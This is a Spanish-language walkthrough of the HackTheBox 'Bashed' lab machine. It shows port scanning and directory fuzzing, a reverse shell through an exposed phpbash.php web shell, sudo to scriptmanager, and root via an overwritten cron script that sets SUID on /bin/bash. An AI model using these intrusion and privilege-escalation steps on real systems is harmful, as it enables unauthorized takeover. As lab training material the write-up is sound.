---
title: HackTheBox - Bashed
categories: [Linux]
tags: [HackTheBox]
image: bashed.png
img_path: /assets/HTB/Bashed
---

En este post voy a explicar como resolver la máquina Bashed de [Hack The Box](https://app.hackthebox.com/machines/118), en la cual vamos a estar ganando acceso mediante un archivo subido en la web el cual nos permite ejecutar comando, y para la escalada nos aprovecharemos de una ```tarea cron```.

## Escaneo de puertos

```
# sudo nmap -p- -sS --min-rate 5000 -sCV -oN nmap -n -Pn 10.10.10.68
Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-12 20:53 -03
Nmap scan report for 10.10.10.68
Host is up (0.23s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Arrexel's Development Site
Nmap done: 1 IP address (1 host up) scanned in 25.87 secondss
```

Como vemos, la página tiene el puerto 80 (HTTP) abierto.

# Enumeración
Al ingresar a la página, vemos esto.

<img src="bashed-pagina.png">

Si hacemos fuzzing, descubriremos un directorio llamado ```/dev```

```
$ wfuzz -c  --hc=404 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  http://10.10.10.68/FUZZ

********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.68/FUZZ
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000164:   301        9 L      28 W       312 Ch      "uploads"
000000338:   301        9 L      28 W       308 Ch      "php"
000000550:   301        9 L      28 W       308 Ch      "css"
000000834:   301        9 L      28 W       308 Ch      "dev"
```

# Reverse Shell

En el directorio ```/dev``` hay almacenado un archivo llamado ```phpbash.php```, ese archivo nos permite ejecutar comandos en la máquina víctima, vamos a mandarnos una reverse shell.

<img src="reverse-shell.png">

```
$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.10.10.68] 50380
bash: cannot set terminal process group (850): Inappropriate ioctl for device
bash: no job control in this shell
www-data@bashed:/var/www/html/dev$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

# Enumeración del sistema
Si hacemos un ```sudo -l```, veremos que podemos ejecutar como el usuario ```scriptmanager``` cualquier comando, vamos a lanzarnos una consola para convertirnos en ese usuario.

```
www-data@bashed:/var/www/html/dev$ sudo -l
Matching Defaults entries for www-data on bashed:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL
www-data@bashed:/var/www/html/dev$ sudo -u scriptmanager bash
scriptmanager@bashed:/var/www/html/dev$ id
uid=1001(scriptmanager) gid=1001(scriptmanager) groups=1001(scriptmanager)
```

Enumerando los directorios del sistema, encontremos uno llamado ```scripts```, en el cual hay dos archivos, uno llamado ```test.py``` y otros ```test.txt```.

```
scriptmanager@bashed:/var/www/html$ cd /scripts 
scriptmanager@bashed:/scripts$ ls -l
total 8
-rw-r--r-- 1 scriptmanager scriptmanager 58 Dec  4  2017 test.py
-rw-r--r-- 1 root          root          12 Dec 12 17:06 test.txt
```
Si leemos el archivo ```test.py```, veremos que simplemente crea un archivo llamado ```test.txt``` en el cual escribe lo siguiente: ```testing 123!```

```
scriptmanager@bashed:/scripts$ cat test.py

f = open("test.txt", "w")
f.write("testing 123!")
f.close
```
Al hacer un ```ls -l``` veremos que el propietario del archivo ```test.py es scriptmanager``` y el propietario del ```test.txt es root```, por ende podemos deducir que hay alguna ```tarea cron``` programada para que este script se ejecute cada cierto tiempo, vamos a modificarlo para que cuando root lo ejecute, le dé permisos de ```SUID a la bash```.

# Escalada de privilegios

```
scriptmanager@bashed:/scripts$ rm test.py
scriptmanager@bashed:/scripts$ echo "import os" > test.py
scriptmanager@bashed:/scripts$ echo 'os.system("chmod u+s /bin/bash")' >> test.py
```

Luego de esperar un rato, al hacer un ```ls -l /bin/bash```, veremos que es ```SUID``` por ende para lanzarnos una bash con los permisos del propietario pondremos ```bash -p```

```
scriptmanager@bashed:/scripts$ bash -p
bash-4.3# whoami
root
```
